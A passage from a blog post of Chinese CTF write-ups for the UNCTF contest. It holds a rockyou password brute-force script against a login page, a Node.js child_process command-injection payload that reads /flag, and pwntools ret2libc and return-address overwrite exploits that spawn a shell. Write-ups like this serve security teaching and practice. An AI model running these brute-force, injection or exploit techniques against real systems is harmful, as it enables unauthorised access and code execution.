<!DOCTYPE html>
<html>
<head>
    

    

    



    <meta charset="utf-8">
    
    
    
    
    <title>UNCTF高校联合招新赛-竞技赛 | hghhgghhg | CTF is funny!</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    
    <meta name="theme-color" content="#3F51B5">
    
    
    <meta name="keywords" content="writeup">
    <meta name="description" content="web帮赵总征婚描述华北最大安全集团NSB老总glzjin最近终于找到了girlfriend，但他现在想要six wife了，你能帮他登录一下这个NSB征婚网站吗？ http:&#x2F;&#x2F;101.71.29.5:10018&#x2F; 解决由网页源码知： 1&amp;lt;!-- I like rockyou! --&amp;gt;  直接使用rockyou.txt爆破密码,脚本如下： 1234567891011121314151">
<meta name="keywords" content="writeup">
<meta property="og:type" content="article">
<meta property="og:title" content="UNCTF高校联合招新赛-竞技赛">
<meta property="og:url" content="http:&#x2F;&#x2F;localhost:4000&#x2F;2019&#x2F;10&#x2F;28&#x2F;UNCTFWP&#x2F;index.html">
<meta property="og:site_name" content="hghhgghhg">
<meta property="og:description" content="web帮赵总征婚描述华北最大安全集团NSB老总glzjin最近终于找到了girlfriend，但他现在想要six wife了，你能帮他登录一下这个NSB征婚网站吗？ http:&#x2F;&#x2F;101.71.29.5:10018&#x2F; 解决由网页源码知： 1&amp;lt;!-- I like rockyou! --&amp;gt;  直接使用rockyou.txt爆破密码,脚本如下： 1234567891011121314151">
<meta property="og:locale" content="zh-CN">
<meta property="og:updated_time" content="2019-10-29T11:10:37.645Z">
<meta name="twitter:card" content="summary">
    
    <link rel="shortcut icon" href="/favicon.ico">
    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
    <script>window.lazyScripts=[]</script>

    <!-- custom head -->
    

</head>

<body>
    <div id="loading" class="active"></div>

    <aside id="menu" class="hide" >
  <div class="inner flex-row-vertical">
    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
        <i class="icon icon-lg icon-close"></i>
    </a>
    <div class="brand-wrap" style="background-image:url(/img/DDD428LOGO.png)">
      <div class="brand">
        <a href="/" class="avatar waves-effect waves-circle waves-light">
          <img src="/img/ddd428.png">
        </a>
        <hgroup class="introduce">
          <h5 class="nickname">hgh</h5>
          <a href="mailto:1950771661@qq.com" target="_blank" rel="noopener" title="1950771661@qq.com" class="mail">1950771661@qq.com</a>
        </hgroup>
      </div>
    </div>
    <div class="scroll-wrap flex-col">
      <ul class="nav">
        
            <li class="waves-block waves-effect">
              <a href="/"  >
                <i class="icon icon-lg icon-home"></i>
                主页
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/archives"  >
                <i class="icon icon-lg icon-archives"></i>
                Archives
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/tags"  >
                <i class="icon icon-lg icon-tags"></i>
                Tags
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="/categories"  >
                <i class="icon icon-lg icon-th-list"></i>
                Categories
              </a>
            </li>
        
            <li class="waves-block waves-effect">
              <a href="https://github.com/hghhgghhg" target="_blank" >
                <i class="icon icon-lg icon-github"></i>
                Github
              </a>
            </li>
        
      </ul>
    </div>
  </div>
</aside>

    <main id="main">
        <header class="top-header" id="header">
    <div class="flex-row">
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
          <i class="icon icon-lg icon-navicon"></i>
        </a>
        <div class="flex-col header-title ellipsis">UNCTF高校联合招新赛-竞技赛</div>
        
        <div class="search-wrap" id="search-wrap">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                <i class="icon icon-lg icon-chevron-left"></i>
            </a>
            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                <i class="icon icon-lg icon-search"></i>
            </a>
        </div>
        
        
        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
            <i class="icon icon-lg icon-share-alt"></i>
        </a>
        
    </div>
</header>
<header class="content-header post-header">

    <div class="container fade-scale">
        <h1 class="title">UNCTF高校联合招新赛-竞技赛</h1>
        <h5 class="subtitle">
            
                <time datetime="2019-10-28T12:22:02.000Z" itemprop="datePublished" class="page-time">
  2019-10-28
</time>


            
        </h5>
    </div>

    


</header>


<div class="container body-wrap">
    
    <aside class="post-widget">
        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
            <h4>TOC</h4>
            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#web"><span class="post-toc-number">1.</span> <span class="post-toc-text">web</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#帮赵总征婚"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">帮赵总征婚</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#描述"><span class="post-toc-number">1.1.1.</span> <span class="post-toc-text">描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#解决"><span class="post-toc-number">1.1.2.</span> <span class="post-toc-text">解决</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#checkin"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">checkin</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#描述-1"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#解决-1"><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">解决</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#pwn"><span class="post-toc-number">2.</span> <span class="post-toc-text">pwn</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#babyrop"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">babyrop</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#描述-2"><span class="post-toc-number">2.1.1.</span> <span class="post-toc-text">描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#解决-2"><span class="post-toc-number">2.1.2.</span> <span class="post-toc-text">解决</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Soso-easy-pwn"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">Soso_easy_pwn</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#描述-3"><span class="post-toc-number">2.2.1.</span> <span class="post-toc-text">描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#解决-3"><span class="post-toc-number">2.2.2.</span> <span class="post-toc-text">解决</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#misc"><span class="post-toc-number">3.</span> <span class="post-toc-text">misc</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#快乐游戏题"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">快乐游戏题</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#描述-4"><span class="post-toc-number">3.1.1.</span> <span class="post-toc-text">描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#解决-4"><span class="post-toc-number">3.1.2.</span> <span class="post-toc-text">解决</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#EasyBox"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">EasyBox</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#描述-5"><span class="post-toc-number">3.2.1.</span> <span class="post-toc-text">描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#解决-5"><span class="post-toc-number">3.2.2.</span> <span class="post-toc-text">解决</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#信号不好我先挂了"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">信号不好我先挂了</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#描述-6"><span class="post-toc-number">3.3.1.</span> <span class="post-toc-text">描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#解决-6"><span class="post-toc-number">3.3.2.</span> <span class="post-toc-text">解决</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Think"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">Think</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#描述-7"><span class="post-toc-number">3.4.1.</span> <span class="post-toc-text">描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#解决-7"><span class="post-toc-number">3.4.2.</span> <span class="post-toc-text">解决</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#reverse"><span class="post-toc-number">4.</span> <span class="post-toc-text">reverse</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#unctf-f-ck-re"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">unctf_f@ck_re</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#描述-8"><span class="post-toc-number">4.1.1.</span> <span class="post-toc-text">描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#解决-8"><span class="post-toc-number">4.1.2.</span> <span class="post-toc-text">解决</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#奇怪的数组"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">奇怪的数组</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#描述-9"><span class="post-toc-number">4.2.1.</span> <span class="post-toc-text">描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#解决-9"><span class="post-toc-number">4.2.2.</span> <span class="post-toc-text">解决</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#easyvm"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">easyvm</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#描述-10"><span class="post-toc-number">4.3.1.</span> <span class="post-toc-text">描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#解决-10"><span class="post-toc-number">4.3.2.</span> <span class="post-toc-text">解决</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#unctf-easy-Maze"><span class="post-toc-number">4.4.</span> <span class="post-toc-text">unctf_easy_Maze</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#描述-11"><span class="post-toc-number">4.4.1.</span> <span class="post-toc-text">描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#解决-11"><span class="post-toc-number">4.4.2.</span> <span class="post-toc-text">解决</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Easy-Android"><span class="post-toc-number">4.5.</span> <span class="post-toc-text">Easy_Android</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#描述-12"><span class="post-toc-number">4.5.1.</span> <span class="post-toc-text">描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#解决-12"><span class="post-toc-number">4.5.2.</span> <span class="post-toc-text">解决</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#666"><span class="post-toc-number">4.6.</span> <span class="post-toc-text">666</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#描述-13"><span class="post-toc-number">4.6.1.</span> <span class="post-toc-text">描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#解决-13"><span class="post-toc-number">4.6.2.</span> <span class="post-toc-text">解决</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#BabyXor"><span class="post-toc-number">4.7.</span> <span class="post-toc-text">BabyXor</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#描述-14"><span class="post-toc-number">4.7.1.</span> <span class="post-toc-text">描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#解决-14"><span class="post-toc-number">4.7.2.</span> <span class="post-toc-text">解决</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#crypto"><span class="post-toc-number">5.</span> <span class="post-toc-text">crypto</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ECC和AES基础"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">ECC和AES基础</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#描述-15"><span class="post-toc-number">5.1.1.</span> <span class="post-toc-text">描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#解决-15"><span class="post-toc-number">5.1.2.</span> <span class="post-toc-text">解决</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#simple-rsa"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">simple_rsa</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#描述-16"><span class="post-toc-number">5.2.1.</span> <span class="post-toc-text">描述</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#解决-16"><span class="post-toc-number">5.2.2.</span> <span class="post-toc-text">解决</span></a></li></ol></li></ol></li></ol>
        </nav>
    </aside>


<article id="post-UNCTFWP"
  class="post-article article-type-post fade" itemprop="blogPost">

    <div class="post-card">
        <h1 class="post-card-title">UNCTF高校联合招新赛-竞技赛</h1>
        <div class="post-meta">
            <time class="post-time" title="2019-10-28 20:22:02" datetime="2019-10-28T12:22:02.000Z"  itemprop="datePublished">2019-10-28</time>

            


            
<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
</span>


        </div>
        <div class="post-content" id="post-content" itemprop="postContent">
            <h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="帮赵总征婚"><a href="#帮赵总征婚" class="headerlink" title="帮赵总征婚"></a>帮赵总征婚</h3><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>华北最大安全集团NSB老总glzjin最近终于找到了girlfriend，但他现在想要six wife了，你能帮他登录一下这个NSB征婚网站吗？</p>
<p><a href="http://101.71.29.5:10018/" target="_blank" rel="noopener">http://101.71.29.5:10018/</a></p>
<h4 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h4><p>由网页源码知：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- I like rockyou! --&gt;</span><br></pre></td></tr></table></figure>

<p>直接使用rockyou.txt爆破密码,脚本如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests, json</span><br><span class="line">f = open(&apos;rockyou.txt&apos;,&apos;r&apos;)</span><br><span class="line">url = &apos;http://101.71.29.5:10018/login.php&apos;</span><br><span class="line">data = &#123; &apos;email&apos;: &apos;admin&apos;, &apos;password&apos;: &apos;12344&apos;,&apos;remember_me&apos;:&apos;1&apos; &#125;</span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.post(url, data)</span><br><span class="line">c = b&apos;&#123;&quot;ret&quot;:0,&quot;data&quot;:&#123;&quot;msg&quot;:&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;&#125;&#125;&apos;</span><br><span class="line">tmp = &apos;aaa&apos;</span><br><span class="line">count = 0</span><br><span class="line">while r.content == c:</span><br><span class="line">    a = f.readline()</span><br><span class="line">    data = &#123; &apos;email&apos;: &apos;admin&apos;, &apos;password&apos;: a, &apos;remember_me&apos;: &apos;1&apos; &#125;</span><br><span class="line">    r = s.post(url, data)</span><br><span class="line">    tmp = a</span><br><span class="line">    count += 1</span><br><span class="line">    if count % 100 == 0:</span><br><span class="line">        print(a)</span><br><span class="line">print(tmp)</span><br><span class="line">print(r.content)</span><br></pre></td></tr></table></figure>



<h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><h4 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h4><p><a href="http://101.71.29.5:10010/" target="_blank" rel="noopener">http://101.71.29.5:10010/</a></p>
<h4 id="解决-1"><a href="#解决-1" class="headerlink" title="解决"></a>解决</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/calc require(&apos;child_process&apos;).execSync(&apos;ls /&apos;).toString();</span><br><span class="line">/calc require(&apos;child_process&apos;).execSync(&apos;cat /flag&apos;).toString();</span><br></pre></td></tr></table></figure>

<p>注意使用bp发送socket数据</p>
<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h3><h4 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h4><h4 id="解决-2"><a href="#解决-2" class="headerlink" title="解决"></a>解决</h4><p>注意LibcSearcher的版本就好。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'101.71.29.5'</span>,<span class="number">10041</span>)</span><br><span class="line">e=ELF(<span class="string">'./babyrop'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Hello CTFer!"</span>)</span><br><span class="line">payload=(<span class="number">0x2c</span><span class="number">-0xc</span>)*<span class="string">'a'</span>+<span class="string">'ffff'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">vul_addr=<span class="number">0x0804853D</span></span><br><span class="line">puts_plt=e.symbols[<span class="string">'puts'</span>]</span><br><span class="line">puts_got=e.got[<span class="string">'puts'</span>]</span><br><span class="line">p.recvuntil(<span class="string">"What is your name?"</span>)</span><br><span class="line">payload=(<span class="number">0x10</span>+<span class="number">0x4</span>)*<span class="string">'a'</span>+p32(puts_plt)+p32(vul_addr)+p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">data=p.recvline()</span><br><span class="line">puts_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_puts_addr=libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line"><span class="comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class="line">obj = LibcSearcher(<span class="string">"puts"</span>, puts_addr)</span><br><span class="line">libc_base=puts_addr-obj.dump(<span class="string">"puts"</span>)</span><br><span class="line">system_addr=libc_base+obj.dump(<span class="string">"system"</span>)        <span class="comment">#system 偏移</span></span><br><span class="line">sh_addr=libc_base+obj.dump(<span class="string">"str_bin_sh"</span>)    <span class="comment">#/bin/sh 偏移</span></span><br><span class="line">p.recvuntil(<span class="string">"What is your name?"</span>)</span><br><span class="line">ret_addr=<span class="number">0x0804839e</span></span><br><span class="line">payload=(<span class="number">0x10</span>+<span class="number">0x4</span>)*<span class="string">'a'</span>+p32(ret_addr)+p32(system_addr)+<span class="string">'aaaa'</span>+p32(sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="Soso-easy-pwn"><a href="#Soso-easy-pwn" class="headerlink" title="Soso_easy_pwn"></a>Soso_easy_pwn</h3><h4 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h4><h4 id="解决-3"><a href="#解决-3" class="headerlink" title="解决"></a>解决</h4><p>有一位随机，没有去搞，多跑几次就好。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'101.71.29.5'</span>,<span class="number">10000</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Welcome our the "</span>)</span><br><span class="line">data=hex(int(p.recvline()[:<span class="number">-7</span>]))</span><br><span class="line">sh_addr=int(data+<span class="string">'59cd'</span>,<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"sh_addr="</span>+hex(sh_addr)</span><br><span class="line">p.recvuntil(<span class="string">"So, Can you tell me your name?"</span>)</span><br><span class="line">payload=<span class="number">12</span>*<span class="string">'a'</span>+p32(sh_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="快乐游戏题"><a href="#快乐游戏题" class="headerlink" title="快乐游戏题"></a>快乐游戏题</h3><h4 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h4><p>玩游戏</p>
<h4 id="解决-4"><a href="#解决-4" class="headerlink" title="解决"></a>解决</h4><p>随机一个好开局就OK了。</p>
<h3 id="EasyBox"><a href="#EasyBox" class="headerlink" title="EasyBox"></a>EasyBox</h3><h4 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h4><p>nc 101.71.29.5 10011</p>
<h4 id="解决-5"><a href="#解决-5" class="headerlink" title="解决"></a>解决</h4><p>题目由数独改编，只是少了一个数独的判断，就是不需要判断九宫格里面是1-9，去掉这个检测即可。</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Suku</span><span class="params">(object)</span> :</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,broad)</span>:</span></span><br><span class="line">        self.b = broad</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(self,x,y,value)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> value == self.b[x][i]:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> value == self.b[j][y]:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next_one</span><span class="params">(self,x,y)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> next_y1 <span class="keyword">in</span> range(y+<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">if</span> self.b[x][next_y1] == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> x,next_y1</span><br><span class="line">        <span class="keyword">for</span> next_x <span class="keyword">in</span> range(x+<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">            <span class="keyword">for</span> next_y2 <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">9</span>):</span><br><span class="line">                <span class="keyword">if</span> self.b[next_x][next_y2] == <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">return</span> next_x,next_y2</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>,<span class="number">-1</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">try_it</span><span class="params">(self,x,y)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.b[x][y] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">                <span class="keyword">if</span> self.check(x,y,i):</span><br><span class="line">                    self.b[x][y] = i</span><br><span class="line">                    next_x,next_y = self.next_one(x,y)</span><br><span class="line">                    <span class="keyword">if</span> next_x == <span class="number">-1</span>:</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        end = self.try_it(next_x,next_y)</span><br><span class="line">                        <span class="keyword">if</span> <span class="keyword">not</span> end :</span><br><span class="line">                            self.b[x][y] = <span class="number">0</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">go</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.b[<span class="number">0</span>][<span class="number">0</span>] == <span class="number">0</span>:</span><br><span class="line">            self.try_it(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x,y = self.next_one(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">            self.try_it(x,y)</span><br><span class="line">        flag = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self.b:</span><br><span class="line">            flag += i</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">hgh = remote(<span class="string">'101.71.29.5'</span>,<span class="string">'10011'</span>)</span><br><span class="line">a = hgh.recvuntil(<span class="string">'Please input row 1 answer :\n'</span>)</span><br><span class="line">a = a.split(<span class="string">'\n'</span>)</span><br><span class="line">sudoku = [<span class="number">0</span>] * <span class="number">81</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9</span>):</span><br><span class="line">    tmp = a[i*<span 